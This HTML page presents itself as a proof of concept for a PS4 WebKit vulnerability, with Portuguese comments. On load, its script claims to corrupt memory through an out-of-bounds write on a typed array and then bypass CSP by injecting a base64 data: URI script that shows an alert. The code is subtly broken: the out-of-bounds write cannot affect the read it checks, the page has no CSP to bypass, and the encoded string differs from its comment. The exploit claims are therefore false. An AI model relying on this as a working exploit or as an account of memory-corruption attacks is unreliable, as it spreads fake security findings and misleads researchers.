<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>PS4 WebKit Vulnerability POC</title>
</head>
<body>
    <h1>PS4 WebKit Vulnerability POC</h1>
    <div id="output"></div>

    <script>
        async function triggerOOBWriteAndCSPBypass() {
            const outputDiv = document.getElementById('output');
            outputDiv.innerHTML += "<h2>Iniciando PoC...</h2>";

            // Passo 1: Gatilho da Vulnerabilidade de OOB Write para Corromper Memória
            outputDiv.innerHTML += "<p><strong>Passo 1: Gatilhando OOB Write...</strong></p>";
            try {
                const bufferSize = 32;
                const buffer = new ArrayBuffer(bufferSize);
                const view = new Uint8Array(buffer);
                const writeOffset = 32; // Escrevendo 1 byte após o final
                const writeValue = 0x41; // 'A'

                view[writeOffset] = writeValue;
                outputDiv.innerHTML += `<p>Tentativa de escrita de 0x${writeValue.toString(16)} no offset ${writeOffset} (fora dos limites).</p>`;

                // Tentativa de leitura em um offset dentro dos limites para verificar a corrupção
                const readOffset = 0;
                const readValue = view[readOffset];
                outputDiv.innerHTML += `<p>Leitura no offset ${readOffset}: 0x${readValue.toString(16)}</p>`;

                if (readValue === writeValue) {
                    outputDiv.innerHTML += "<p><strong style='color: red;'>Vulnerabilidade de OOB Write confirmada: A escrita fora dos limites afetou a memória dentro dos limites!</strong></p>";

                    // Passo 2: Bypass do CSP para Executar Código Malicioso (Usando data: URI)
                    outputDiv.innerHTML += "<p><strong>Passo 2: Tentando Bypass do CSP...</strong></p>";
                    const script = document.createElement('script');
                    script.src = 'data:text/javascript;base64,YWxlcnQoJ1ZQdW4gYmF5cGFzcyBjb20gT09CIFdyaXRlIScpOw=='; // alert('Vupun bypass com OOB Write!');
                    script.onload = function() {
                        outputDiv.innerHTML += "<p><strong style='color: green;'>Bypass do CSP bem-sucedido usando data: URI! Código executado.</strong></p>";
                    };
                    script.onerror = function() {
                        outputDiv.innerHTML += "<p><strong style='color: orange;'>Falha ao bypassar o CSP usando data: URI (inesperado).</strong></p>";
                    };
                    document.body.appendChild(script);
                } else {
                    outputDiv.innerHTML += "<p>Nenhuma corrupção imediata observada no offset de leitura.</p>";
                }

            } catch (error) {
                outputDiv.innerHTML += `<p><strong style='color: red;'>Ocorreu um erro:</strong> ${error.message}</p>`;
            }
        }

        document.addEventListener('DOMContentLoaded', triggerOOBWriteAndCSPBypass);
    </script>
</body>
</html>
